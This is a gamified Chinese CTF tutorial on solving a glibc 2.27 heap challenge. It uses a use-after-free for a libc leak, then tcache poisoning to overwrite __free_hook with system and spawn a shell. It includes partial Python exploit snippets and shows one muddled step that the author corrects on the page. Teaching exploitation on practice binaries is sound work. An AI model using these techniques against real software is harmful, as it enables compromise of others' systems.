# 第 29 关 · BOSS 战二：一道堆题的完整通关节奏

## 🎬 游戏开场

最终 BOSS——一道典型的堆题。它有个菜单:添加、删除、编辑、打印笔记。

堆题比栈题复杂,因为你要**先分析程序逻辑,找到堆漏洞,再精心布局**。但我们同样有固定节奏:

```
侦察 → 分析菜单 → 找漏洞 → 泄露 → 布局 → 劫持 → 触发
```

---

## 🧠 战斗流程(游戏化)

### 第一步:侦察

```bash
checksec --file=heap_chall
```

假设:Full RELRO + NX + PIE 全开,glibc 2.27。

翻译:**公告板焊死(改不了GOT)、不能自带代码、地址随机**。策略:泄露 libc → 劫持 __free_hook → system。

### 第二步:分析菜单

用 IDA/Ghidra 或 gdb 逆向,搞清楚:

- add:malloc(size),把指针存到全局数组,读入内容。
- delete:free(ptr),但**没把数组里的指针清空**(UAF 信号!)。
- edit:往指针指向的地方写内容。
- show:打印指针指向的内容。

发现 delete 后指针还在 → **UAF**!

### 第三步:确认漏洞

- delete 后还能 show/edit 同一个 chunk → UAF 读+写。
- 利用 UAF 读:free 一个大 chunk,show 它,读出 unsorted bin 的 fd → **泄露 libc**(第 21 关)。

```python
add(0, 0x500, b'A')      # 大chunk
add(1, 0x20, b'guard')   # 防止合并
delete(0)
show(0)                  # UAF读,泄露main_arena
leak = u64(...)
libc_base = leak - main_arena_offset
```

### 第四步:布局 + tcache poisoning

目标是让 malloc 返回 `__free_hook` 的地址:

```python
# 制造 tcache dup 或 poisoning
add(2, 0x60, b'B')
delete(2)
# UAF写:改 chunk2 的 fd/next 指向 __free_hook
edit(2, p64(free_hook))     # 2.27无safe-linking,直接写fd
add(3, 0x60, b'X')          # 拿到chunk2
add(4, 0x60, b'/bin/sh')    # 返回free_hook!往里写"/bin/sh"地址? 
```

等等——经典套路是:让第二次 malloc 返回 `__free_hook`,然后往里写 `system` 地址:

```python
add(4, 0x60, p64(system_addr))   # __free_hook = system
```

然后 free 一个内容为 `/bin/sh` 的 chunk:

```python
add(5, 0x60, b'/bin/sh\x00')
delete(5)   # free(5) 触发 __free_hook("...") = system("/bin/sh")
```

### 第五步:触发 shell

`free(5)` 时,因为 `__free_hook` 被改成 system,实际执行 `system(chunk5的内容)` = `system("/bin/sh")` → shell 到手。

```
$ cat flag
flag{heap_boss_defeated}
```

## 📌 堆题通关节奏总结

| 步骤 | 动作 | 关键技能 |
| --- | --- | --- |
| 1 侦察 | checksec + glibc版本 | 定策略 |
| 2 分析菜单 | 逆向每个功能 | 找漏洞 |
| 3 泄露 | UAF读/unsorted bin | libc基址 |
| 4 布局 | tcache poisoning | 任意地址malloc |
| 5 劫持 | 写__free_hook | 改写钩子 |
| 6 触发 | free("/bin/sh") | getshell |

**堆题的核心心法**:分析清楚每个功能 → 找到漏洞 → 泄露 → 布局 → 劫持。版本不同,细节不同,但节奏一致。
